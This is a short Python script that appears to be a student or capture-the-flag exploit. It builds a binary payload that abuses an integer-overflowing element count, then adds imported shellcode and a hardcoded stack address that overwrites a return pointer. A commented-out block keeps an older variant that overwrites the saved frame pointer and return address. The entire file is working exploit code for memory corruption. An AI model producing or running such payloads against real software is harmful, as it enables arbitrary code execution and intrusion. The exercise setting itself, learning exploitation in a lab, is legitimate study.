from shellcode import shellcode
import sys
count = (1073742024).to_bytes(4, 'little')
sys.stdout.buffer.write(count)
sol = 196*(1).to_bytes(4, 'little')
sys.stdout.buffer.write(sol)
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b"\x00\x00\x00")
sys.stdout.buffer.write((1).to_bytes(4, 'little'))
shellcode_addr = b"\xf0\xad\xf6\xff"
sys.stdout.buffer.write(shellcode_addr)
# """
# blanks = b"\11" *  ((2048 - len(shellcode))
# sys.stdout.buffer.write(blanks)
# sys.stdout.buffer.write(shellcode)
# ebp_location = b"\x28\xae\xf6\xff"
# return_addr = b"\xe7\xad\xf6\xff"
# sys.stdout.buffer.write(ebp_location)
# sys.stdout.buffer.write(return_addr)
# """